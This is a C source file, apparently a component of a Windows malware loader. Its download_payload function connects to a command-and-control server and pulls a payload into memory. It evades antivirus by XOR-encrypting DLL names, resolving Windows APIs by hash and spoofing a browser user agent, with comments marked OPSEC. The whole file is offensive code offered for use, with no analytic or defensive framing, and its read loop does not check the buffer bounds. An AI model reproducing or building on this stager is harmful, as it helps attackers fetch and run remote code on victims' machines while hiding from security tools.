#include "config.h"
#include "network.h"
#include "evasion.h"
#include <stdio.h>

// used to cast generic API function pointer (FARPROC)
typedef HINTERNET (WINAPI *pInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef HINTERNET (WINAPI *pInternetOpenUrlA)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
typedef BOOL (WINAPI *pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL (WINAPI *pInternetCloseHandle)(HINTERNET);
typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL (WINAPI *pVirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);

char* download_payload(const char* url, SIZE_T* payload_size) {
    // load key runtime (in stack)
    LOAD_GLOBAL_KEY(cypher_key, cypher_key_len);
    
    char enc_wininet[] = { 0x28, 0x1a, 0x1b, 0x19, 0x5d, 0x16, 0x47, 0x4d, 0x16, 0x5f, 0x18, 0x6b };
    char enc_kernel32[] = { 0x34, 0x16, 0x07, 0x1e, 0x56, 0x1f, 0x00, 0x51, 0x5c, 0x57, 0x18, 0x07, 0x33 };

    // API hashes
    // NOTE: calculate these using hasher.py
    DWORD hash_IntOpen = 0xF4AD70A1;      // djb2 for "InternetOpenA"
    DWORD hash_IntOpenUrl = 0x8F5CA3B4;   // djb2 for "InternetOpenUrlA"
    DWORD hash_IntReadFile = 0xFB4F8EAA;  // djb2 for "InternetReadFile"
    DWORD hash_IntClose = 0x4241BEF0;     // djb2 for "InternetCloseHandle"
    DWORD hash_VirtAlloc = 0x382C0F97;    // djb2 for "VirtualAlloc"
    DWORD hash_VirtFree = 0x668FCF2E;     // djb2 for "VirtualFree"

    // --- load DLLs dynamically
    
    // wininet.dll
    xor_crypt(enc_wininet, sizeof(enc_wininet), cypher_key, cypher_key_len);
    HMODULE hWinINet = LoadLibraryA(enc_wininet);
    // OPSEC: recypher DLL name immediately
    xor_crypt(enc_wininet, sizeof(enc_wininet), cypher_key, cypher_key_len);

    // kernel32.dll
    xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);
    HMODULE hKernel32 = LoadLibraryA(enc_kernel32);
    // OPSEC: recypher DLL name immediately
    xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);

    // if DLL loading fails -> return
    if (!hWinINet || !hKernel32) return NULL;

    // --- dynamic resolution via hashing

    pInternetOpenA fnInternetOpenA = (pInternetOpenA) get_api_by_hash(hWinINet, hash_IntOpen);
    pInternetOpenUrlA fnInternetOpenUrlA = (pInternetOpenUrlA) get_api_by_hash(hWinINet, hash_IntOpenUrl);
    pInternetReadFile fnInternetReadFile = (pInternetReadFile) get_api_by_hash(hWinINet, hash_IntReadFile);
    pInternetCloseHandle fnInternetCloseHandle = (pInternetCloseHandle) get_api_by_hash(hWinINet, hash_IntClose);
    pVirtualAlloc fnVirtualAlloc = (pVirtualAlloc) get_api_by_hash(hKernel32, hash_VirtAlloc);
    pVirtualFree fnVirtualFree = (pVirtualFree) get_api_by_hash(hKernel32, hash_VirtFree);

    // if AV blocks a function -> return
    if (!fnInternetOpenA || !fnInternetOpenUrlA || !fnInternetReadFile || !fnInternetCloseHandle || !fnVirtualAlloc || !fnVirtualFree) return NULL;

    // --- download file logic
    
    // act as a legitimate browser (ex. Firefox)
    HINTERNET hInternet = fnInternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return NULL;

    // open connection to C2 server
    HINTERNET hUrl = fnInternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        fnInternetCloseHandle(hInternet);
        return NULL;
    }

    // prepare memory buffer to hold payload (4 MB)
    SIZE_T buffer_size = 4 * 1024 * 1024; 
    
    // use dynamically resolved VirtualAlloc
    char* payload_buffer = (char*) fnVirtualAlloc(NULL, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (!payload_buffer) {
        fnInternetCloseHandle(hUrl);
        fnInternetCloseHandle(hInternet);
        return NULL;
    }

    DWORD bytes_read = 0;
    DWORD total_bytes_read = 0;

    // --- read file logic
    do {
        if (!fnInternetReadFile(hUrl, payload_buffer + total_bytes_read, 1024, &bytes_read)) {
            break; // reading error
        }
        total_bytes_read += bytes_read;
    } while (bytes_read > 0);

    // clean connections
    fnInternetCloseHandle(hUrl);
    fnInternetCloseHandle(hInternet);

    // if reading fail, clean memory and release buffer
    if (total_bytes_read == 0) {
        // use dynamically resolved VirtualFree
        fnVirtualFree(payload_buffer, 0, MEM_RELEASE);
        return NULL;
    }

    // save payload size
    *payload_size = total_bytes_read;
    return payload_buffer;
}
